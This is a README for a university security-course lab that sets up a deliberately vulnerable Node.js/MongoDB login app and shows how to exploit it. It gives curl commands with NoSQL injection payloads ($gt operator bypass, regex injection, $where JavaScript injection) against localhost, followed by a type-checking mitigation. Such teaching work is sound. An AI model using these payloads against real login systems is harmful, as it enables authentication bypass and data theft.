# Modern Database Attacks: NoSQL Injection Lab

## 1. Project Overview
This project is a professional demonstration of **NoSQL Injection** vulnerabilities within a modern web stack (Node.js, Express, and MongoDB). It simulates a real-world authentication bypass and data extraction process, providing both vulnerable and secure implementations for educational purposes.

**Project Metadata:**
* **Course:** Introduction to Information Security.
* **Instructor:** PhD. Huynh Ngoc Tu.
* **Team Members:** 
    * Nguyen Ho Vinh Hien - 523H0026.
    * Le Phuong Uyen - 523H0113.

## 2. Prerequisites
- Node.js (version 14 or higher)
- MongoDB (running locally on default port 27017)
- npm (comes with Node.js)

## 3. Installation & Setup
Follow these commands to set up the environment from scratch.

### Step 1: Initialize Project
```bash
mkdir nosql-injection-demo ; cd nosql-injection-demo
npm init -y
```

### Step 2: Install Dependencies
```bash
npm install express mongodb dotenv
npm install --save-dev nodemon
```

### Step 3: Environment Configuration
Create a `.env` file in the root directory:
```env
PORT=3000
MONGODB_URI=mongodb://localhost:27017
DB_NAME=security_demo_db
```

## 4. Database Preparation
Before running the app, ensure MongoDB is running and insert a target user. Open your terminal/MongoDB Shell and run:

```javascript
use security_demo_db;

db.users.insertOne({
  username: "admin_hien",
  password: "TDTU_super_secret_password_2026",
  role: "administrator",
  student_id: "523H0026"
});
```

## 5. Running the Application
1. Install dependencies: `npm install`
2. Start the server: `npm start` or `node src/app.js`
3. For development with auto-restart: `npx nodemon src/app.js`

The application will be available at: `http://localhost:3000`

## 6. Testing the Application
This demo includes four login endpoints for testing different NoSQL injection attacks and mitigations.

### Web Interface Testing
- Open `http://localhost:3000` in your browser
- Use the login form to test normal authentication and injection payloads
- Select different endpoints from the dropdown to test various attack vectors
- Example payloads for each endpoint:

### CLI Testing (using curl)
Use these commands to test all four endpoints:

#### Snippet 1: Vulnerable Backend Authentication Logic (/login) - Allows Logic Bypass
```bash
# Normal login
curl -X POST http://localhost:3000/login \
-H "Content-Type: application/json" \
-d '{"username": "admin_hien", "password": "TDTU_super_secret_password_2026"}'

# Injection bypass ($gt)
curl -X POST http://localhost:3000/login \
-H "Content-Type: application/json" \
-d '{"username": "admin_hien", "password": {"$gt": ""}}'
```

#### Snippet 2: Advanced Blind Injection (Regex Implementation) (/login-regex) - Allows Regex Injection
```bash
# Normal login
curl -X POST http://localhost:3000/login-regex \
-H "Content-Type: application/json" \
-d '{"username": "admin_hien", "password": "TDTU_super_secret_password_2026"}'

# Regex injection (matches any password starting with "TDTU")
curl -X POST http://localhost:3000/login-regex \
-H "Content-Type: application/json" \
-d '{"username": "admin_hien", "password": "^TDTU"}'
```

#### Snippet 3: Server-Side JavaScript Injection (SSJI via $where) (/login-script) - Allows JS Code Execution
```bash
# Normal login
curl -X POST http://localhost:3000/login-script \
-H "Content-Type: application/json" \
-d '{"username": "admin_hien", "password": "TDTU_super_secret_password_2026"}'

# JS injection (always true)
curl -X POST http://localhost:3000/login-script \
-H "Content-Type: application/json" \
-d '{"username": "admin_hien", "password": "1==1"}'
```

#### Snippet 4: Secure Mitigation (Type Checking) (/login-secure) - Blocks Injection
```bash
# Normal login (works)
curl -X POST http://localhost:3000/login-secure \
-H "Content-Type: application/json" \
-d '{"username": "admin_hien", "password": "TDTU_super_secret_password_2026"}'

# Injection attempt (blocked)
curl -X POST http://localhost:3000/login-secure \
-H "Content-Type: application/json" \
-d '{"username": "admin_hien", "password": {"$gt": ""}}'
```

## 7. Mitigation Strategy
The system implements **Strict Type Validation** in the `loginSecure` controller:
* It checks if `typeof password === 'string'` before querying the database.
* Any non-primitive inputs (Objects/Arrays) are rejected with a `400 Bad Request`.